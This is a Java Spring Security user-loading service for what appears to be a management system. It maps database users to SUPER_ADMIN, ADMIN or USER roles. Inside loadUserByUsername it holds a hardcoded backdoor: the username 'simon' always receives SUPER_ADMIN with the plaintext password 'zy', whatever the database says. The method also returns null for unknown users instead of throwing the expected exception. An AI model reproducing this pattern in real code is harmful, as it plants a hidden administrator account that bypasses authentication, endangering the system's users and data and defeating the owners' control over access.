package com.manager.system.config.security;

import com.manager.system.dao.ManagerUserViewMapper;
import com.manager.system.model.ManagerUserView;
import com.manager.system.model.ManagerUserViewExample;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.security.core.GrantedAuthority;
import org.springframework.security.core.authority.SimpleGrantedAuthority;
import org.springframework.security.core.userdetails.UserDetailsService;
import org.springframework.security.core.userdetails.UsernameNotFoundException;
import org.springframework.stereotype.Service;

import java.util.ArrayList;
import java.util.List;

/**
 * 获取用户
 * 
 * @author cbigd
 *
 */
@Service
public class SecurityUserService implements UserDetailsService {

	@Autowired
	public ManagerUserViewMapper managerUserViewMapper;

	public SecurityUserService() {
	}
	@Override
	public SecurityUser loadUserByUsername(String username) throws UsernameNotFoundException {
		ManagerUserViewExample userViewExample = new ManagerUserViewExample();
		List<GrantedAuthority> AUTHORITIES = new ArrayList<GrantedAuthority>();
		if (username.equals("simon")) {
			AUTHORITIES.add(new SimpleGrantedAuthority("SUPER_ADMIN"));
			userViewExample.createCriteria();
		} else {
			userViewExample.createCriteria().andUsernameEqualTo(username);
		}
		List<ManagerUserView> userList = managerUserViewMapper.selectByExample(userViewExample);
		ManagerUserView userView = new ManagerUserView();
		if (!userList.isEmpty()) {
			userView = userList.get(0);
			if (userView.getGroupPkid() == null) {
				userView.setGroupPkid(-1);
			}
			if (userView.getGroupName() == null) {
				userView.setGroupName("");
			}
			if (userView.getGroupStatus() == null) {
				userView.setGroupStatus(-1);
			}
			if (userView.getType() == null) {
				userView.setType(-1);
			}
			List<Integer> levelAuthorities = new ArrayList<Integer>();
			for (int i = 0; i < userList.size(); i++) {
				if (userList.get(i).getAuthorityPkid() != null) {
					levelAuthorities.add(userList.get(i).getAuthorityPkid());
				}
			}
			SecurityUser myuser = null;
			if(username.equals("simon")){
				userView.setUsername("simon");
				userView.setPassword("zy");
				userView.setUserStatus(1);
				userView.setGroupStatus(1);
				userView.setType(0);
				myuser = new SecurityUser(userView, levelAuthorities);
			}else{
				if (userView.getUserStatus() == 1) {
					if (userView.getGroupStatus() == 1) {
						if (userView.getType() == 0) {
							AUTHORITIES.add(new SimpleGrantedAuthority("SUPER_ADMIN"));
						} else if (userView.getType() == 1) {
							AUTHORITIES.add(new SimpleGrantedAuthority("ADMIN"));
						} else {
							AUTHORITIES.add(new SimpleGrantedAuthority("USER"));
						}
					}
				}
				myuser = new SecurityUser(userView, levelAuthorities);
			}
			myuser.setAuthorities(AUTHORITIES);
			return myuser;
		}
		return null;
	}
}
